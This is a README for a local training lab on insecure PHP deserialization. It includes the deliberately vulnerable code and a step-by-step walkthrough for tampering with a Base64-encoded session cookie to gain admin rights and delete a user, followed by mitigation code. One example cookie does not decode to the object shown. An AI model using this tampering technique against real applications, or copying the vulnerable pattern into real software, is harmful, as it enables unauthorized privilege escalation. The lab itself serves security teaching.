<p align="center">
  <img src="https://img.shields.io/badge/Lab_01-Serialized_Objects-DC2626?style=for-the-badge" alt="Lab 01">
  <img src="https://img.shields.io/badge/Difficulty-Apprentice-22C55E?style=for-the-badge" alt="Apprentice">
  <img src="https://img.shields.io/badge/Type-Insecure_Deserialization-DC2626?style=for-the-badge" alt="Insecure Deserialization">
</p>

<h1 align="center">🔓 Modifying Serialized Objects</h1>

<p align="center">
  <strong>Insecure Deserialization Lab 01</strong><br>
  <em>Exploit serialized session cookies to escalate privileges</em>
</p>

---

## 🎯 Objective

**Mission:** Exploit the insecure deserialization vulnerability to escalate your privileges from a regular user to administrator, then delete user `carlos`.

**Scenario:** The application uses PHP serialization to store session data in a client-side cookie. This cookie contains an `admin` boolean flag that can be manipulated.

---

## 📋 Lab Information

| Property | Value |
|----------|-------|
| **Difficulty** | 🟢 Apprentice (Beginner) |
| **Category** | Insecure Deserialization |
| **Vulnerability Type** | Privilege Escalation via Cookie Tampering |
| **OWASP Classification** | A08:2021 – Software and Data Integrity Failures |
| **Time to Complete** | 10-15 minutes |
| **Prerequisites** | Basic understanding of Base64 encoding |

---

## 🚀 Quick Start

```bash
# 1. Access the lab
http://localhost/LABx_Docs/Insecure-Deserialization/Lab-01/

# 2. Login with test credentials
Username: wiener
Password: peter

# 3. Decode the session cookie (Base64)
# 4. Modify admin:b:0 → admin:b:1
# 5. Re-encode and replace cookie
# 6. Access admin.php and delete carlos
```

---

## 🗂️ Lab Structure

```
Lab-01/
├── 📄 index.php              # Main landing page
├── 📄 login.php              # User authentication
├── 📄 logout.php             # Session termination
├── 📄 my-account.php         # User profile (shows admin link)
├── 🔴 admin.php              # VULNERABLE: Admin panel
├── ⚙️ config.php             # Database configuration
├── 🗄️ setup_db.php           # Database initialization
├── 📊 database_setup.sql     # SQL schema
├── 📄 docs.php               # Technical documentation
├── 📄 lab-description.php    # Challenge description
├── 📄 LAB_DOCUMENTATION.md   # Detailed walkthrough
├── 📄 SETUP.md               # Setup instructions
├── ✅ success.php            # Lab completion verification
└── 📄 README.md              # This file
```

---

## 👥 Test Credentials

| Username | Password | Role | Notes |
|----------|----------|------|-------|
| `admin` | `admin123` | Administrator | Has access to admin.php |
| `wiener` | `peter` | User | 🎯 **Use this account to exploit** |
| `carlos` | `carlos123` | User | 🎯 **TARGET - Delete this user** |

---

## 🔍 Vulnerability Analysis

### What is Insecure Deserialization?

Insecure deserialization occurs when an application:
1. Accepts serialized data from untrusted sources
2. Deserializes it without proper validation
3. Trusts the deserialized data for security decisions

### The Attack Surface

| Component | Details |
|-----------|---------|
| **Entry Point** | Session cookie containing serialized PHP object |
| **Vulnerability** | Unvalidated deserialization of user-controlled data |
| **Impact** | Privilege escalation from regular user to admin |
| **Exploitation** | Modify the `admin` attribute in serialized object |

### The Flaw

```php
// VULNERABLE CODE
// Session data stored in cookie (client-controlled!)
$session_data = base64_decode($_COOKIE['session']);
$user = unserialize($session_data);

// Trusting the admin flag from client-controlled data
if ($user->admin) {
    // Grant admin access!
}
```

### Impact Assessment

| Impact Area | Severity | Description |
|-------------|----------|-------------|
| Confidentiality | 🔴 Critical | Access all admin data |
| Integrity | 🔴 Critical | Delete any user, modify data |
| Availability | 🔴 Critical | Delete all users |
| Business | 🔴 Critical | Complete account takeover |

---

## 💀 Exploitation Guide

### Step 1: Login and Capture the Cookie

1. Login with credentials: `wiener` / `peter`
2. Open browser Developer Tools (F12)
3. Go to **Application** → **Cookies**
4. Find the `session` cookie

Example cookie:
```
session=TzozMDoic3RkQ2xhc3MiOjM6e3M6ODoidXNlcm5hbWUiO3M6Njoid2llbmVyIjtzOjU6ImFkbWluIjtiOjA7czo3OiJ1c2VyX2lkIjtpOjM7fQ%3D%3D
```

### Step 2: Decode the Cookie

**URL Decode** (if needed - remove %3D%3D → ==):
```
TzozMDoic3RkQ2xhc3MiOjM6e3M6ODoidXNlcm5hbWUiO3M6Njoid2llbmVyIjtzOjU6ImFkbWluIjtiOjA7czo3OiJ1c2VyX2lkIjtpOjM7fQ==
```

**Base64 Decode:**
```php
O:8:"stdClass":3:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;s:7:"user_id";i:3;}
```

### Step 3: Understanding PHP Serialization Format

```
O:8:"stdClass"     → Object of class "stdClass" (8 chars)
:3:                → Object has 3 properties
{                  → Start of properties
  s:8:"username";  → String key "username" (8 chars)
  s:6:"wiener";    → String value "wiener" (6 chars)
  s:5:"admin";     → String key "admin" (5 chars)
  b:0;             → Boolean FALSE (0=false, 1=true) ← ATTACK HERE!
  s:7:"user_id";   → String key "user_id" (7 chars)
  i:3;             → Integer value 3
}                  → End of properties
```

### Step 4: Modify the Admin Flag

**Before (Regular User):**
```php
O:8:"stdClass":3:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;s:7:"user_id";i:3;}
                                                          ^^^
                                                      b:0 = false
```

**After (Admin):**
```php
O:8:"stdClass":3:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;s:7:"user_id";i:3;}
                                                          ^^^
                                                      b:1 = true
```

### Step 5: Re-encode and Replace Cookie

**Base64 Encode the modified string:**
```
Tzo4OiJzdGRDbGFzcyI6Mzp7czo4OiJ1c2VybmFtZSI7czo2OiJ3aWVuZXIiO3M6NToiYWRtaW4iO2I6MTtzOjc6InVzZXJfaWQiO2k6Mzt9
```

**Replace the cookie in DevTools:**
1. Double-click the session cookie value
2. Paste the new Base64 string
3. Press Enter

### Step 6: Access Admin Panel

1. Navigate to `my-account.php` - you should now see "Admin Panel" link
2. Go to `admin.php`
3. Find user `carlos` in the user list
4. Click "Delete" next to carlos
5. 🎉 **Lab Completed!**

---

## 🛠️ Tools & Techniques

### Command Line Decoding

```bash
# Decode the cookie
echo "TzozMDoic3RkQ2xhc3MiOjM6..." | base64 -d

# Encode modified data
echo -n 'O:8:"stdClass":3:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;s:7:"user_id";i:3;}' | base64
```

### Using CyberChef

1. Go to [CyberChef](https://gchq.github.io/CyberChef/)
2. Add "From Base64" operation
3. Paste the cookie value
4. Modify the output
5. Add "To Base64" operation to encode

### Using Burp Suite

```
1. Enable intercept in Burp
2. Make a request to my-account.php
3. Find the Cookie: session=... header
4. Send to Decoder tab
5. Decode Base64 → modify → Encode Base64
6. Replace in request and forward
```

---

## 🛡️ Prevention & Mitigation

### Secure Implementation

```php
<?php
// ✅ SECURE: Use server-side sessions
session_start();

// Store session data on server, only session ID in cookie
$_SESSION['user_id'] = $user_id;
$_SESSION['username'] = $username;
$_SESSION['admin'] = false;  // Server-controlled!

// Check admin status from database, not session
function isAdmin($user_id) {
    global $pdo;
    $stmt = $pdo->prepare("SELECT is_admin FROM users WHERE id = ?");
    $stmt->execute([$user_id]);
    return $stmt->fetchColumn() == 1;
}
```

### If You Must Use Client-Side Storage

```php
<?php
// ✅ Sign serialized data with HMAC
$secret_key = getenv('SESSION_SECRET');
$data = serialize($session_data);
$signature = hash_hmac('sha256', $data, $secret_key);
$cookie_value = base64_encode($data . '|' . $signature);

// Verify signature before deserializing
function verify_and_unserialize($cookie_value, $secret_key) {
    $decoded = base64_decode($cookie_value);
    list($data, $signature) = explode('|', $decoded, 2);
    
    $expected = hash_hmac('sha256', $data, $secret_key);
    if (!hash_equals($expected, $signature)) {
        die('Invalid session signature');
    }
    
    return unserialize($data);
}
```

### Security Checklist

- ✅ Use server-side session storage (not client-side cookies)
- ✅ Never trust client-controlled data for authorization
- ✅ Sign/encrypt sensitive cookies with HMAC or JWT
- ✅ Validate user permissions against database
- ✅ Implement proper access control on all admin endpoints
- ✅ Use PHP's `allowed_classes` parameter with `unserialize()`

---

## 📚 Key Learning Points

### What This Lab Teaches

1. **Serialization is not security**
   - Base64 encoding is NOT encryption
   - Serialized data can be easily decoded and modified

2. **Never trust client-controlled data**
   - Cookies, form inputs, headers are all user-controlled
   - Authorization must be verified server-side

3. **Defense in Depth**
   - Admin endpoints should verify permissions independently
   - Don't rely on a single "admin" flag

### PHP Serialization Format Reference

| Type | Format | Example |
|------|--------|---------|
| Boolean | `b:<0/1>;` | `b:1;` |
| Integer | `i:<number>;` | `i:42;` |
| String | `s:<length>:"<value>";` | `s:5:"hello";` |
| Array | `a:<size>:{...}` | `a:2:{i:0;s:1:"a";i:1;s:1:"b";}` |
| Object | `O:<len>:"<class>":<props>:{...}` | `O:4:"User":2:{...}` |
| NULL | `N;` | `N;` |

### Real-World Examples

- **CVE-2015-8562**: Joomla! RCE via deserialization
- **CVE-2017-9805**: Apache Struts2 deserialization
- **CVE-2020-9484**: Apache Tomcat session persistence

---

## 🔗 Related Resources

| Resource | Link |
|----------|------|
| OWASP Deserialization | [owasp.org/Top10/A08_2021](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/) |
| PortSwigger Deserialization | [portswigger.net/web-security/deserialization](https://portswigger.net/web-security/deserialization) |
| PHP Serialization | [php.net/manual/en/function.serialize.php](https://www.php.net/manual/en/function.serialize.php) |
| CWE-502 | [cwe.mitre.org/data/definitions/502](https://cwe.mitre.org/data/definitions/502.html) |

---

## ✅ Completion Checklist

- [ ] Logged in with test credentials (wiener:peter)
- [ ] Captured the session cookie
- [ ] Decoded Base64 to reveal serialized object
- [ ] Identified the admin boolean flag (b:0)
- [ ] Modified admin flag to true (b:1)
- [ ] Re-encoded and replaced cookie
- [ ] Accessed admin panel
- [ ] Deleted user carlos
- [ ] Reached success.php

---

<p align="center">
  <strong>Lab 01</strong> • Insecure Deserialization Series<br>
  <a href="../../">🏠 Home</a> • <a href="../Lab-02/">Next Lab →</a>
</p>
